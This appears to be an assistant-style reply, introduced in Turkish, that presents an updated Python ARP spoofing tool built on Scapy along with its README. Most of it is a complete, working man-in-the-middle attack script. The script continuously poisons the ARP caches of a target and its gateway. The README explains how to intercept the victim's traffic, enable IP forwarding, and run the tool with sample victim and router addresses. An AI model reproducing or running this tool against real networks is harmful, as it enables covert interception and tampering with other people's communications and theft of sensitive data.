### Güncellenmiş Kod

Aşağıda `interface` eklenmiş güncellenmiş kod yer alıyor. Artık kullanıcıdan ağ arayüzünü de komut satırında alabileceksiniz:

```python
#!/usr/bin/python

import scapy.all as scapy
import argparse
from colorama import Fore, Style, init

# Initialize colorama
init(autoreset=True)

class ArpSpoofer:
    def __init__(self, target_ip, spoof_ip, interface):
        """
        Constructor for ArpSpoofer class. Initializes target, spoof IP addresses, and network interface.
        
        :param target_ip: The target machine's IP address.
        :param spoof_ip: The IP address you want to impersonate (e.g., the gateway).
        :param interface: The network interface to use for packet sending.
        """
        self.target_ip = target_ip
        self.spoof_ip = spoof_ip
        self.interface = interface

    def get_mac(self, ip):
        """
        Sends an ARP request to retrieve the MAC address of the specified IP.
        
        :param ip: The IP address to get the MAC address for.
        :return: The MAC address of the target IP.
        """
        request = scapy.ARP(pdst=ip)
        broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
        final_packet = broadcast / request
        answer = scapy.srp(final_packet, iface=self.interface, timeout=2, verbose=False)[0]
        mac = answer[0][1].hwsrc
        return mac

    def spoof(self, target, spoofed):
        """
        Spoofs the target machine by pretending to be the spoofed IP address.
        
        :param target: The target IP address to attack.
        :param spoofed: The IP address you're pretending to be (usually the gateway).
        """
        mac = self.get_mac(target)
        packet = scapy.ARP(op=2, hwdst=mac, pdst=target, psrc=spoofed)
        scapy.send(packet, iface=self.interface, verbose=False)
        print(Fore.YELLOW + f"[+] Spoofing {target} pretending to be {spoofed}")

    def restore(self, dest_ip, source_ip):
        """
        Restores the ARP table of the target to its original state.
        
        :param dest_ip: The destination IP whose ARP table is being restored (e.g., target machine).
        :param source_ip: The IP to restore to its legitimate MAC address (e.g., gateway).
        """
        dest_mac = self.get_mac(dest_ip)
        source_mac = self.get_mac(source_ip)
        packet = scapy.ARP(op=2, pdst=dest_ip, hwdst=dest_mac, psrc=source_ip, hwsrc=source_mac)
        scapy.send(packet, iface=self.interface, verbose=False)
        print(Fore.GREEN + f"[+] Restoring {dest_ip} to its original state.")

    def run(self):
        """
        Starts the ARP spoofing attack by continuously sending spoofed packets.
        Restores ARP tables upon interruption (CTRL+C).
        """
        try:
            while True:
                self.spoof(self.target_ip, self.spoof_ip)  # Spoof the target IP
                self.spoof(self.spoof_ip, self.target_ip)  # Spoof the spoofed IP
        except KeyboardInterrupt:
            print(Fore.RED + "[!] Detected CTRL+C. Restoring ARP tables... Please wait.")
            self.restore(self.target_ip, self.spoof_ip)
            self.restore(self.spoof_ip, self.target_ip)
            print(Fore.GREEN + "[+] ARP tables restored.")

if __name__ == "__main__":
    # Setting up argparse for command-line arguments
    parser = argparse.ArgumentParser(description="ARP Spoofing Tool to sniff network traffic.")
    parser.add_argument("-t", "--target", required=True, help="Target IP address to spoof.")
    parser.add_argument("-s", "--spoof", required=True, help="Spoofed IP address (e.g., the gateway IP).")
    parser.add_argument("-i", "--interface", required=True, help="Network interface to use (e.g., eth0, wlan0).")

    # Parse the arguments
    args = parser.parse_args()

    # Create an ArpSpoofer object and start the spoofing process
    spoofer = ArpSpoofer(target_ip=args.target, spoof_ip=args.spoof, interface=args.interface)
    spoofer.run()
```

### Güncellenmiş README.md

```markdown
# ARP Spoofing Tool

## Description

This repository contains an ARP spoofing tool that demonstrates how to perform LAN network attacks using `Scapy`, a Python package for crafting and manipulating network packets. The `spoofing.py` script is designed to carry out an `ARP spoofing` attack, enabling the attacker to intercept communications and perform a Man-in-the-Middle (MITM) attack.

The attack works by tricking a target device on the same subnet into thinking that the attacker's machine is the router (gateway), thereby redirecting traffic through the attacker.

## How It Works

1. The attacker sends fake ARP responses to both the victim and the router, associating the attacker's MAC address with the router's IP address.
2. This alters the ARP tables of the victim and the router, redirecting traffic from the victim to the attacker.
3. The attacker can now intercept and manipulate network traffic, potentially gaining access to sensitive information.

## Scenario

For this example:
- The victim is a `Windows 10 machine` (192.168.1.130).
- The attacker is using a `Kali Linux` machine (192.168.1.111).
- The router has the IP address `192.168.1.1`.

Steps:
- The victim sends an ARP request for the router's MAC address.
- The attacker sends a fake ARP response, claiming to be the router.
- The victim updates its ARP table with the attacker's MAC address, redirecting traffic through the attacker.

## Forwarding Traffic

To prevent a Denial of Service (DoS) condition where the victim loses internet access, the attacker can enable IP forwarding. This allows the attacker to pass traffic between the victim and the router while still intercepting it.

To enable IP forwarding on the attacker's machine:
```bash
echo 1 > /proc/sys/net/ipv4/ip_forward
```

## Usage

Make sure you adjust the IP addresses and the network interface in the script if necessary.

Run the script with the following command:
```bash
sudo ./spoofing.py -t <target_ip> -s <spoofed_ip> -i <interface>
```

### Example:
```bash
sudo ./spoofing.py -t 192.168.1.130 -s 192.168.1.1 -i eth0
```

When the script is interrupted (e.g., by pressing `CTRL+C`), it will automatically restore the ARP tables of the victim and router to their original state.

## Setup

To set up the environment:
1. Create a virtual environment (optional):
   ```bash
   virtualenv -p python3 <name_of_the_env>
   source <name_of_the_env>/bin/activate
   ```
2. Install the required dependencies:
   ```bash
   pip install -r requirements.txt
   ```

## Dependencies

- **Scapy**: For crafting and sending ARP packets.
- **colorama**: For colored terminal output.
- **argparse**: For parsing command-line arguments.

## Updates by Halil İbrahim

This tool has been updated and refactored by **Halil İbrahim**. The updates include:
- Class-based structure for better maintainability.
- Command-line argument parsing using `argparse` for flexible usage.
- Color-coded output using `colorama` for better readability.

Visit [denizhalil.com](https://denizhalil.com) for more tools, tutorials, and cybersecurity resources.

### Check Out My Books
- **Mastering Linux Networking and Security: Essential and Advanced Techniques**  
  [Support on BuyMeACoffee](https://www.buymeacoffee.com/halildeniz/e/315997)
  
- **Mastering Scapy: A Comprehensive Guide to Network Analysis**  
  [Support on BuyMeACoffee](https://www.buymeacoffee.com/halildeniz/e/182908)
  
- **Mastering Python for Ethical Hacking: A Comprehensive Guide to Building Hacking Tools**

## Join the Community

Feel free to join our **Production Brain** Discord server to discuss cybersecurity, Python projects, and more:  
[Join Production Brain Discord](https://discord.gg/nGBpfMHX4u)

## Credits

- Original author: [David E Lares](https://twitter.com/davidlares3)
- Updated by: Halil İbrahim (denizhalil.com)

## License

- [MIT License](https://opensource.org/licenses/MIT)
```

### Değişiklikler:
- `interface` desteği eklendi.
- README.md dosyası, `interface` kullanımını ve güncellemeleri açıklayacak şekilde yeniden düzenlendi.
